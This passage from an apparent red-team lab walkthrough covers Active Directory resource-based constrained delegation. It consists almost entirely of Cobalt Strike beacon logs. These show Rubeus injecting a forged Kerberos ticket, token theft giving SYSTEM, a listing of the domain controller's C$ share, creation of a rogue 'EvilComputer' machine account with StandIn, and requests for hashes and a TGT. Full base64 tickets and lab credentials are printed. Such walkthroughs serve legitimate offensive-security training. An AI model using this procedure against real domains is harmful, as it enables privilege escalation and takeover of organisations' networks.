      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
```
Finally, pass the ticket into a logon session for use.
```POWERSHELL
[12/07 00:43:51] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket: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
[12/07 00:43:56] [*] Tasked beacon to run .NET program: Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket: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
[12/07 00:43:56] [+] host called home, sent: 555272 bytes
[12/07 00:43:57] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 


[*] Action: Create Process (/netonly)


[*] Using DEV\nlamb:FakePass

[*] Showing process : False
[*] Username        : nlamb
[*] Domain          : DEV
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 21432
[+] Ticket successfully imported!
[+] LUID            : 0x45c8a1
```
`steal_token` & `ls \\dc-2.dev.cyberbotic.io\c$`
```powershell
[12/07 00:44:16] beacon> steal_token 21432
[12/07 00:44:16] [*] Tasked beacon to steal token from PID 21432
[12/07 00:44:16] [+] host called home, sent: 12 bytes
[12/07 00:44:16] [+] Impersonated NT AUTHORITY\SYSTEM
[12/07 00:44:26] beacon> ls \\dc-2.dev.cyberbotic.io\c$
[12/07 00:44:26] [*] Tasked beacon to list files in \\dc-2.dev.cyberbotic.io\c$
[12/07 00:44:26] [+] host called home, sent: 45 bytes
[12/07 00:44:26] [*] Listing: \\dc-2.dev.cyberbotic.io\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/15/2022 15:44:08   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
          dir     08/19/2021 06:24:49   EFI
          dir     08/15/2022 16:09:55   inetpub
          dir     05/08/2021 08:20:24   PerfLogs
          dir     09/26/2023 09:25:37   Program Files
          dir     08/10/2022 04:06:16   Program Files (x86)
          dir     11/02/2023 19:48:51   ProgramData
          dir     08/15/2022 15:23:23   Recovery
          dir     08/16/2022 12:37:38   Shares
          dir     09/05/2022 12:03:43   System Volume Information
          dir     08/15/2022 15:24:39   Users
          dir     09/26/2023 09:28:03   Windows
 427kb    fil     08/10/2022 05:00:07   bootmgr
 1b       fil     05/08/2021 08:14:33   BOOTNXT
 181b     fil     11/04/2022 11:31:03   CheckServiceHealth.ps1
 1kb      fil     08/15/2022 16:16:13   dc-2.dev.cyberbotic.io_sub-ca.req
 12kb     fil     12/06/2023 23:37:08   DumpStack.log.tmp
 384mb    fil     12/06/2023 23:37:08   pagefile.sys
```
to reset `msDS-AllowedToActOnBehalfOfOtherIdentity` execute command below as `bfarmer` beacon session on `WKSTN-2`

```powershell
[12/07 00:45:51] beacon> powerpick Get-DomainComputer -Identity dc-2 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity
[12/07 00:45:51] [*] Tasked beacon to run: Get-DomainComputer -Identity dc-2 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity (unmanaged)
[12/07 00:45:51] [+] host called home, sent: 138070 bytes
```


------
# How to do Without System ore Local Admin

If you did not have local admin access to a computer already, you can resort to creating your own computer object.  By default, even domain users can join up to 10 computers to a domain - controlled via the _ms-DS-MachineAccountQuota_ attribute of the domain object.

```powershell
beacon> powershell Get-DomainObject -Identity "DC=dev,DC=cyberbotic,DC=io" -Properties ms-DS-MachineAccountQuota

ms-ds-machineaccountquota
-------------------------
                       10
```
[StandIn](https://github.com/FuzzySecurity/StandIn) is a post-ex toolkit written by [Ruben Boonen](https://twitter.com/FuzzySec) and has the functionality to create a computer with a random password.
```powershell
[12/07 01:33:40] beacon> execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make
[12/07 01:33:43] [*] Tasked beacon to run .NET program: StandIn.exe --computer EvilComputer --make
[12/07 01:33:43] [+] host called home, sent: 310084 bytes
[12/07 01:33:44] [+] received output:

[?] Using DC    : dc-2.dev.cyberbotic.io
    |_ Domain   : dev.cyberbotic.io
    |_ DN       : CN=EvilComputer,CN=Computers,DC=dev,DC=cyberbotic,DC=io

[12/07 01:33:44] [+] received output:
    |_ Password : br33GijQoYi7gyW

[+] Machine account added to AD..

```
Rubeus `hash` can take that password and calculate their hashes.
```powershell
[12/07 01:39:41] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password:br33GijQoYi7gyW /user:EvilComputer$ /domain:dev.cyberbotic.io
[12/07 01:39:45] [*] Tasked beacon to run .NET program: Rubeus.exe hash /password:br33GijQoYi7gyW /user:EvilComputer$ /domain:dev.cyberbotic.io
[12/07 01:39:46] [+] host called home, sent: 550816 bytes
[12/07 01:39:46] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 


[*] Action: Calculate Password Hash(es)

[*] Input password             : br33GijQoYi7gyW
[*] Input username             : EvilComputer$
[*] Input domain               : dev.cyberbotic.io
[*] Salt                       : DEV.CYBERBOTIC.IOhostevilcomputer.dev.cyberbotic.io
[*]       rc4_hmac             : EA1D41E309F3D83CE351507D5F52863B
[*]       aes128_cts_hmac_sha1 : F072B76D15959899066792C53B0B378C
[*]       aes256_cts_hmac_sha1 : 55C0C524897020F0861B60E7E07C169C21237B1E99B32001D8DDD91B7B41C19F
[*]       des_cbc_md5          : 6D04B00DC14A26F1

```
These can then be used with `asktgt` to obtain a TGT for the fake computer.
```powershell
[12/07 01:46:42] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:55C0C524897020F0861B60E7E07C169C21237B1E99B32001D8DDD91B7B41C19F /nowrap
[12/07 01:46:47] [*] Tasked beacon to run .NET program: Rubeus.exe asktgt /user:EvilComputer$ /aes256:55C0C524897020F0861B60E7E07C169C21237B1E99B32001D8DDD91B7B41C19F /nowrap
[12/07 01:46:47] [+] host called home, sent: 550878 bytes
[12/07 01:46:48] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 

[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: 55C0C524897020F0861B60E7E07C169C21237B1E99B32001D8DDD91B7B41C19F
[*] Building AS-REQ (w/ preauth) for: 'dev.cyberbotic.io\EvilComputer$'
[*] Using domain controller: 10.10.122.10:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIF8jCCBe6gAwIBBaEDAgEWooIE4zCCBN9hggTbMIIE16ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFkZXYuY3liZXJib3RpYy5pb6OCBJEwggSNoAMCARKhAwIBAqKCBH8EggR7+WxaCubo4m5JpAF8oK+X8DoZCzLrka5zaB35o1ENTpkQ2pDoL0B1FnuKXoKJkY0O/d/Z8UqU66lYLVYwB1Bp3HwdCbx7q9ZzaVhTf3Nx8R3mW1LUT9e1RU6bWQ9OZjtog0JG2WK1ArTRYtCdgMYjxnw+hdekqAE6gmPy1hmshTnzw7rYRac1X4J/j7Zr9MDQSL/qa+fDip5i984/LPl0w4yq6vXHzEgKlM5PRauH0vWwLfYPa1AJcJC44HgyczDLLTXfTLibOa4YFK88ZeXDPELn7L+NmNmRBRp+oXUJtyimmDCsnhqHRS5n9Jd0Up9/b8eEtXnGt4GzYftcnLlRlStekr1rXqOiwXBdoJM+nEa8V34HNrEkQr6w1R7PMxUV7s0z+5nqHodi1UbqpVodq49jCGLJ1dZimpi8HIHf9znjWv9q7rDfxbk1rzO74QL+k9/NZKfPugiUn5EdSG6xa99W4Xg0/w17sUebpJxTQ4wQRL4PrcUZgBk9DD1xbkzWviqKpgmMsHkUraRl5O56sAUlURcVJiJ0lisJOBAXMS/vwyKVjZF82et95d3EbSidwpYcslKq7YtGLwNc57+z8UP8NMbeSfSNhoGqVr87/2Y2rHEO5jMbdkfnaloUeP0xCZLUErogTk4y6C4JDhJ2/ZYG5ETlf5JkBH5hYXEmEMf+VvcuBl0uwV1B3KqynisvpOYdHeje8pE7MwxVOxfLy8y+qVp5WGTWPWoI0qQ+RcrFbq0MBYe/+EsqjKbpEf7hoHEnOlUoCqnQSekbeMQg7hTxiC10Fg99FOcgm4gPuxbg5IRYn1kFlPauIJm21nbMJ+CXZn71q0b6nB31W9Z5OEs46q1cDSgOc94ojwij2E/wVxOR5t/3qw9YswRMgCuxavb66JCCoieftwD7Lje39lUYEHDWvO49LHfi3AfNv0lf0zRfaAZIzKJ4Dk89h6WHK/p2XAT2883psRcMqSVEFFjkgGbmcZR0y669oYks11hskIzHjLyhIdgf2CMPKFLvfSPqu03PmL6Rhf7iW9h04p0G640c4TKJ6jKhdxw3tdlhw5CMzhOLREjVQ95SnaLMKrpYCRIKks1cr7fjD7avIBLyyLkxkByPy7xy4JwdxPMzNgMGvb4CQc43WafVvHDk1HqkjnqRpr9k+m4gSIqU7ibfRsHzO9OIAYE+JUQLL3hJPSKQL33QQAgLnZWrFUqTeZ0ohPkE4DPkm8YqwOGxtLsaPgg7XvDtbRK3/3rboXMPZ1qJVJr4qUwIC/BuMORhoeZHs41XhMv00/0qCoXPwrgfSs/p/f86S8sMpV/aOz2VuEh267YehgWsVXoUKpx0T9NnYiMfklf/r2eNcfSU2nqjMq/ZfDDwEK6WqGmRsiuv7hkpUVqraksH1B2psgBsFiEgKKMJGLSS1NAV3o4aSGZP4XXpCi1aI6moWyXIjoYgeeXL4EVgX9W94yCal/jX2mU9XNK+EJOu1orvF+YDwuwPHpHz02R7F3S4sn5zFabSEhv2UBRY6FLMy6OB+jCB96ADAgEAooHvBIHsfYHpMIHmoIHjMIHgMIHdoCswKaADAgESoSIEIMOEDd+q6JaKZnshH8/M7hPKG+LonypJ7YWvCY5GIk6OoRMbEURFVi5DWUJFUkJPVElDLklPohowGKADAgEBoREwDxsNRXZpbENvbXB1dGVyJKMHAwUAQOEAAKURGA8yMDIzMTIwNzAxNDY0OFqmERgPMjAyMzEyMDcxMTQ2NDhapxEYDzIwMjMxMjE0MDE0NjQ4WqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRZGV2LmN5YmVyYm90aWMuaW8=

  ServiceName              :  krbtgt/dev.cyberbotic.io
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  EvilComputer$
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  12/7/2023 1:46:48 AM
  EndTime                  :  12/7/2023 11:46:48 AM
  RenewTill                :  12/14/2023 1:46:48 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  w4QN36rolopmeyEfz8zuE8ob4uifKkntha8JjkYiTo4=
  ASREP (key)              :  55C0C524897020F0861B60E7E07C169C21237B1E99B32001D8DDD91B7B41C19F
```
And the rest of the attack is the same.